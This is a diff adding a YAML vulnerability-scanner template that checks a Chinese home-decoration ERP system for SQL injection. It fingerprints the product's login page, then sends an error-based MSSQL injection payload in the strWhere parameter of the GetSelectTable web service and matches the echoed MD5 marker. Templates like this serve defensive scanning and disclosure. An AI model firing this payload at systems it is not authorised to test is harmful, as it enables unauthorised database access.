@@ -1,0 +1,43 @@
+id: poc-yaml-znfit-erp-ms-getselecttable-sqli
+info:
+  name: 家装ERP管理系统 GetSelectTable SQL注入漏洞
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: sql-injection
+
+variables:
+  t1: "{{rand_int(1000, 10000)}}"
+  t2: "{{md5(t1)}}"
+
+http:
+  - raw:
+      - |
+        GET /main/login.aspx HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "上海装盟信息科技有限公司"
+
+  - raw:
+      - |
+        GET /WEB_SERVICE/Budget.asmx/GetSelectTable?tableName=master.dbo.sysdatabases&strWhere=1=sys.fn_varbintohexstr(hashbytes('MD5','{{t1}}')) HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 500
+      - type: word
+        words:
+          - "0x{{t2}}"
+          - "转换成数据类型"
+        regex:
+          - "转换成数据类型(.*?)时失败"
+          - "在将(.*?)值"
